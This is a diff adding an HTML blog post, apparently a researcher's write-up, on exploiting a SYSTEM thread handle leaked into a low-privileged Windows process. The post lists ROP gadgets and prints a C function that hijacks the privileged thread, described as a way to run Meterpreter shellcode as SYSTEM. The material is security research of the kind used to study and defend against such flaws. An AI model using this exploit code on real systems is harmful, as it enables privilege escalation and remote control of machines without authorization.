@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+  <style>
+
+  </style>
+  <title>Blog</title>
+</head>
+<body class="my-12">
+  <div class="container mx-auto">
+    <article class="prose lg:prose-xl max-w-none">
+        <h1>Whoops… I dropped my SYSTEM thread HANDLE</h1>
+<ul>
+<li><a href="/test/test.html">test</a></li>
+</ul>
+<p>I recently came across an interesting finding from <a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a>, the tool reported an exploitable leaked thread handle. This is when a privileged process leaks a handle (in this case a thread handle) into an unprivileged process, effectively allowing the unprivileged user to gain access to the privileged handle. These must be manually investigated and while mine was unfortunately a false positive, I still wanted to understand how one would exploit this vulnerability.</p>
+<h2>Recreating the Vulnerability</h2>
+<p>You might be wondering how this happens? Well if you look at the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a> documentation, you will see:</p>
+<blockquote>
+<p>bInheritHandles - If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process.</p>
+</blockquote>
+<p>So if a SYSTEM service created a process inside the user's desktop with <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUserA</a>, and set <code>bInheritHandles</code> to TRUE, all inheritable handles within the SYSTEM process are now also available inside the user process.</p>
+<p>I recreated this exact setup with <a href="https://github.com/Acebond/LeakyService">https://github.com/Acebond/LeakyService</a>. This service will pop-up a cmd.exe inside the user's desktop with a leaked SYSTEM thread handle.</p>
+<h2>Exploitation the Wrong Way</h2>
+<p>The <a href="https://dronesec.pw/blog/exploiting-leaked-process-and-thread-handles/">exploiting-leaked-process-and-thread-handles</a> blog says that this can be exploited with <code>NtImpersonateThread</code>. The idea is that the low privileged user can impersonate the thread token, to gain code execution with a SYSTEM thread token.</p>
+<p><img src="/assets/img/2024-10-10/suspicious_dog.jpg" alt="suspicious dog"></p>
+<p>While the blog mentioned above is excellent, I don't believe it and everyone who says this can PoC || GTFO. An example of what they <em>think</em> can be done is here: <a href="https://github.com/Acebond/NtImpersonateThreadMethod">https://github.com/Acebond/NtImpersonateThreadMethod</a>. This method fails, and <code>NtImpersonateThread</code> only creates a thread running with an <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels">impersonation level</a> of <code>SecurityIdentification</code>. To work successfully, the attack requires <code>SeImpersonatePrivilege</code> privilege, which no low privileged user should ever had, otherwise they would hardly be low privileged. If the low privileged user did have <code>SeImpersonatePrivilege</code>, this would work, and the newly created thread would be running with a SYSTEM token with an impersonation level of <code>SecurityImpersonation</code>.</p>
+<h2>Exploitation the Right Way</h2>
+<p>I couldn't find any other way to exploit this other than doing ROP with <code>SetThreadContext</code>, <code>GetThreadContext</code>, <code>SuspendThread</code>, and <code>ResumeThread</code>.</p>
+<p>The Internet seems to call this “ghost writing” since no process level manipulation such as <code>ReadProcessMemory</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> are performed, because, well, we can't - we only have access to the thread, not the process.</p>
+<p>I based my PoC heavily on <a href="https://github.com/fern89/ghostwriting-2">https://github.com/fern89/ghostwriting-2</a>. This was about the best PoC for ghost writing I could find, except it was only for 32bit.</p>
+<p>The ROP requires 3 gadgets:</p>
+<ol>
+<li>A <code>ret</code> gadget. This pops an address off the stack and jumps to that address. We use it to execute function after setting up the parameters.</li>
+<li>A <code>jmp $ gadget</code>. This jumps backward by 2 bytes and causes <code>rip</code> to jump back to itself, creating an infinite loop. We use it to stop the thread from executing past our push gadget and into the unknown.</li>
+<li>A <code>push rdx; call rax gadget</code>. This will push <code>rdx</code> onto the stack, a value we control, and then be used to call <code>rax</code> which will hold the address of our <code>jmp $</code> infinite loop gadget. We use it to push data to the stack, and effectively halt the thread from doing anything meaningful.</li>
+</ol>
+<p>The 3rd gadget could be anything like:</p>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span>push reg1; call reg2
+</span></span><span style="display:flex;"><span>push reg1; jmp reg2
+</span></span><span style="display:flex;"><span>push reg1; push reg2; ret
+</span></span><span style="display:flex;"><span>mov [reg1]; ret
+</span></span><span style="display:flex;"><span>mov [reg1]; call reg2
+</span></span><span style="display:flex;"><span>mov [reg1]; jmp reg2
+</span></span></code></pre><p>With these gadgets, and a <strong>VERY</strong> good (nobody seems to talk about the shadow space except for <a href="https://retroscience.net/x64-assembly.html">https://retroscience.net/x64-assembly.html</a>, thank you) understanding of the Windows 64bit calling convention, we can execute a function in the remote thread like so:</p>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span>DWORD64 <span style="color:#50fa7b">CallFuncRemote</span>(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL returnVal, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">uint64_t</span> count, <span style="color:#ff79c6">const</span> DWORD64 parameters[]) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 1. Check/Fix Stack alignment
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    CONTEXT ctx <span style="color:#ff79c6">=</span> { .ContextFlags <span style="color:#ff79c6">=</span> CONTEXT_FULL };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    SuspendThread(hThread);
+</span></span><span style="display:flex;"><span>    GetThreadContext(hThread, <span style="color:#ff79c6">&amp;</span>ctx);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> isStackAlignmentGood <span style="color:#ff79c6">=</span> ((ctx.Rsp <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x08</span>) <span style="color:#ff79c6">==</span> ((ctx.Rsp <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x08</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0x0F</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> isEvenPUSHParameters <span style="color:#ff79c6">=</span> ((count <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">||</span> (count <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ResumeThread(hThread);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (isStackAlignmentGood <span style="color:#ff79c6">^</span> isEvenPUSHParameters) {
+</span></span><span style="display:flex;"><span>        PushData(hThread, gadgets, <span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 2. PUSH function parameters
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">uint64_t</span> i <span style="color:#ff79c6">=</span> count; i <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">4</span>; i<span style="color:#ff79c6">--</span>) {
+</span></span><span style="display:flex;"><span>        PushData(hThread, gadgets, parameters[i<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 3. PUSH shadow space if required
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">4</span>) {
+</span></span><span style="display:flex;"><span>        PushData(hThread, gadgets, <span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>        PushData(hThread, gadgets, <span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>        PushData(hThread, gadgets, <span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>        PushData(hThread, gadgets, <span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 4. PUSH jmps save return pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    PushData(hThread, gadgets, gadgets.jmps);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 5. PUSH function to call address
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    PushData(hThread, gadgets, funcAddr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 6. Execute with ret gadget
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    Slay(hThread, gadgets, 
+</span></span><span style="display:flex;"><span>        (count <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">?</span> parameters[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>),
+</span></span><span style="display:flex;"><span>        (count <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">?</span> parameters[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>),
+</span></span><span style="display:flex;"><span>        (count <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">?</span> parameters[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>),
+</span></span><span style="display:flex;"><span>        (count <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">?</span> parameters[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 7. Ensure the thread _did_ something
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    WaitUnblock(hThread);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 8. Get return value if required
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">return</span> (returnVal <span style="color:#ff79c6">?</span> GetReturnValue(hThread, gadgets) <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><p>Full code here: <a href="https://github.com/Acebond/GhostWrite64">https://github.com/Acebond/GhostWrite64</a></p>
+<p>We use this to <code>VirtualAlloc</code> some memory in the privileged process, write some shellcode to that memory with a named pipe, and then call <code>CreateThread</code> to execute the shellcode, and lastly, restore the hijacked thread back to whatever it was doing. The full PoC is on <a href="https://github.com/Acebond/GhostWrite64">GitHub</a> and has some cool tricks like figuring out if the target thread has been scheduled on the CPU yet, and how to determine if we need to realign the stack.</p>
+<h3>PoC || GTFO</h3>
+<p>In the screenshot below, LeakyService is running, and will spawn a cmd.exe as the lowpriv user. The cmd.exe (PID 9060 in this example) has a leaked thread handle to the LeakyService.exe which is running as SYSTEM.</p>
+<p><img src="/assets/img/2024-10-10/process.png" alt="System Informer showing the leaked handle"></p>
+<p>To exploit this, I ran the GhostWrite PoC inside the cmd.exe (you'd otherwise have to <code>OpenProcess</code> and <code>DuplicateHandle</code>); this causes the leaked handle to leak again from cmd.exe into GhostWrite.exe, because cmd creates process with inherit handles set to TRUE.</p>
+<p><img src="/assets/img/2024-10-10/poc.png" alt="PoC getting a Meterpreter shell"></p>
+<p>GhostWrite then hijacks the SYSTEM thread using the leaked handle and the ROP method described above, creates its own thread inside the SYSTEM process to run a Meterpreter shellcode, and seamlessly restores the original thread execution. Easy-peasy.</p>
+
+    </article >
+  </div>
+</body>
+</html>
